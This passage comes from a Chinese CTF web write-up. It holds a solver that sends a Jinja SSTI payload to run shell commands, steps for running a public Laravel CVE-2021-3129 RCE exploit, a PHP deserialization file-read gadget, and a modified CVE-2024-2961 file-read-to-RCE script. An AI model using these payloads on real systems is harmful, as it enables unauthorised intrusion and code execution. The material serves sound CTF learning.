class="string">&quot;Are you ready for this?&quot;</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 等待 1 秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二次请求 /calc，模拟页面定时刷新后的情况</span></span><br><span class="line">    response = requests.get(calc_url, headers=headers)</span><br><span class="line">    h1_text = response.text.strip()  <span class="comment"># 获取返回内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查返回内容是否为算术表达式</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^[\d\+\-\*/\s]+$&quot;</span>, h1_text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;算术表达式为：&quot;</span>, h1_text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 使用 eval 计算结果</span></span><br><span class="line">            result = <span class="built_in">eval</span>(h1_text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算结果为：&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构造带有计算结果和 username 参数的 URL</span></span><br><span class="line">            answer_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=提交&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;&#123;&#123;[].__class__.__base__.__subclasses__()[351](&#x27;cat$&#123;IFS&#125;/flag&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 提交答案并打印返回内容</span></span><br><span class="line">            response = requests.get(answer_url, headers=headers,data=data)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;提交答案后的返回内容：&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 提取返回中的 flag&#123;&#125; 内容</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;flag\&#123;.*?\&#125;&#x27;</span>, response.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                flag = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;获取到的 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;未找到 flag!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算表达式时出错：&quot;</span>, e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;返回内容不是算术表达式：&quot;</span>, h1_text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;页面内容未发生变化，h1 内容为：&quot;</span>, h1_text)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204533224-871070081.png" alt="img"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204538045-365324802.png" alt="img"></p><h2 id="ezlaravel"><a href="#ezlaravel" class="headerlink" title="ezlaravel"></a>ezlaravel</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204558132-668296899.png" alt="img"></p><p>有版本号，google搜相关exp</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204607120-450017409.png" alt="img"></p><p>通过<a href="https://www.ambionics.io/blog/laravel-debug-rce">https://www.ambionics.io/blog/laravel-debug-rce</a></p><p>验证确定是CVE-2021-3129</p><p>图片上的链接试过出不来，接着找其他这个CVE的exp</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204642089-281007871.png" alt="img"></p><p>最终在github挨个试，找到这个项目<a href="https://github.com/joshuavanderpoll/CVE-2021-3129">https://github.com/joshuavanderpoll/CVE-2021-3129</a></p><p>要把项目中的phpggc-master目录下的文件都复制到与CVE-2021-3129.py同级目录，不然会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">3129.</span>py --force</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204705557-1565179572.png" alt="img"></p><p><code>laravel/rce12</code>这条链子可以RCE</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204725436-400606183.png" alt="img"></p><p>最后在根目录找到flag.txt</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204740357-677709090.png" alt="img"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204746082-101934285.png" alt="img"></p><h2 id="fileread"><a href="#fileread" class="headerlink" title="fileread"></a>fileread</h2><p>题目给了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls1</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cls</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$arr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;arr <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls2</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$filename</span> = <span class="string">&#x27;hello.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$txt</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">           <span class="title function_ invoke__">var_dump</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="string">&#x27;fileput&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fileput</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$key</span>).<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fileput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your file:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">    <span class="variable">$cls</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]);</span><br><span class="line">    <span class="variable">$instance</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cls</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个简单的反序列化,这样简单构造就能任意文件读取,但是读flag没有权限,后来看<code>/proc/1/cmdline</code>可以发现有个<code>/tmp/run.sh</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;cls=<span class="keyword">new</span> <span class="title function_ invoke__">cls2</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;arr[]=<span class="string">&quot;fileput&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;cls-&gt;filename=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/proc/1/cmdline&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204837024-984031556.png" alt="img"></p><p>能够发现有个<code>/readflag</code>，最后肯定是要执行<code>/readflag</code>来获得flag，所以就是要任意文件读取转<code>rce</code>一开始试了<code>filterchain</code>写马,结果没成功,又试了<code>php_filter_oracle</code>攻击也没成功，不过这个可能是我打的有问题，最后尝试<code>CVE-2024-2961</code>，也是文件读取转RCE，但是得改脚本</p><p>之前的比赛也有考这个CVE的题，例如:<a href="[http://fffffilm.top/2024/09/15/BaseCTF-WEB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Just-Readme](http://fffffilm.top/2024/09/15/BaseCTF-WEB部分题解/#Just-Readme">BaseCTF的Just Readme</a>)和<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18296185">春秋杯夏季赛wordpress</a></p><p>主要借鉴了春秋杯夏季赛wordpress最后攻击的点改的脚本.</p><p>最主要是改Remote这个类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tweak it to fit your target, and start the exploit.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.url = url</span><br><span class="line">        self.session = Session()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        p = <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">        <span class="comment"># 生成序列化字符串，并计算编码后的路径长度</span></span><br><span class="line">        a = <span class="built_in">len</span>(p)</span><br><span class="line">        serialized_path = <span class="string">f&#x27;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;&#123;s:8:&quot;filename&quot;;s:<span class="subst">&#123;a&#125;</span>:&quot;<span class="subst">&#123;p&#125;</span>&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:&quot;fileput&quot;;&#125;&#125;&#125;&#125;;&#x27;</span></span><br><span class="line">        <span class="comment"># 对整个序列化后的字符串进行 base64 编码</span></span><br><span class="line">        encoded_serialized_path = base64.encode(serialized_path.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        url =self.url</span><br><span class="line">        params=&#123;</span><br><span class="line">                <span class="string">&quot;ser&quot;</span>:encoded_serialized_path</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(params)</span><br><span class="line">        response = self.session.get(url, params=params)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"><span class="comment"># 打印实际请求的 UR</span></span><br><span class="line">       <span class="comment"># return self.session.get(url, params=params)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the contents of a remote file.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#     p = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span></span><br><span class="line">    <span class="comment">#生成序列化字符串，并计算编码后的路径长度</span></span><br><span class="line">    <span class="comment">#     a = len(p)</span></span><br><span class="line">    <span class="comment">#     serialized_path = f&#x27;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;&#123;s:8:&quot;filename&quot;;s:&#123;a&#125;:&quot;&#123;p&#125;&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:&quot;fileput&quot;;&#125;&#125;&#125;&#125;;&#x27;</span></span><br><span class="line">    <span class="comment"># 对整个序列化后的字符串进行 base64 编码</span></span><br><span class="line">    <span class="comment">#     encoded_serialized_path = base64.encode(serialized_path.encode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="comment">#     print(encoded_serialized_path)</span></span><br><span class="line">    <span class="comment"># 发送请求，获取响应</span></span><br><span class="line">        response = self.send(path)</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        <span class="comment">#path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span></span><br><span class="line">        <span class="comment">#response = self.send(path)</span></span><br><span class="line">        data = re.search(<span class="string">r&#x27;Your file:(.*)&#x27;</span>, response.text, flags=re.S).group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#data=response.text</span></span><br><span class="line">        <span class="keyword">return</span> base64.decode(data)</span><br></pre></td></tr></table></figure><p>由于我们是要传递<code>http://url?ser=base64</code>加密后的payload，所以要更改原exp的请求部分，原exp是在path那部分传递payload，而我们需要在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;cls1&quot;</span>:<span class="number">2</span>:&#123;&#123;s:<span class="number">3</span>:<span class="string">&quot;cls&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;cls2&quot;</span>:<span class="number">2</span>:&#123;&#123;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:&#123;a&#125;:<span class="string">&quot;&#123;p&#125;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;txt&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;arr&quot;</span>;a:<span class="number">1</span>:&#123;&#123;i:<span class="number">0</span>;s:<span class="number">7</span>:<span class="string">&quot;fileput&quot;</span>;&#125;&#125;&#125;&#125;;</span><br></pre></td></tr></table></figure><p>这里传递payload，于是在序列化字符串<code>filename</code>部分改成<code>s:&#123;a&#125;:&quot;&#123;p&#125;&quot;</code>，<code>&#123;a&#125;</code>是payload的长度，<code>&#123;p&#125;</code>是原payload</p><p>之后再用base64加密,并将原来的post传参改成get传参即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = self.session.get(url, params=params)</span><br></pre></td></tr></table></figure><p>然后就是另一个卡我半天的点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = re.search(<span class="string">r&#x27;Your file:(.*)&#x27;</span>, response.text, flags=re.S).group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>匹配语句这部分，要匹配的是响应的内容<code>file:</code>之后的部分</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205236168-702125291.png" alt="img"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205241457-510358314.png" alt="img"></p><p>在<code>def download</code>这个函数里写的传payload,最后执行exp的时候<code>send</code>函数里没写报的错,把这个一改就直接打通了</p><p>最终exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span 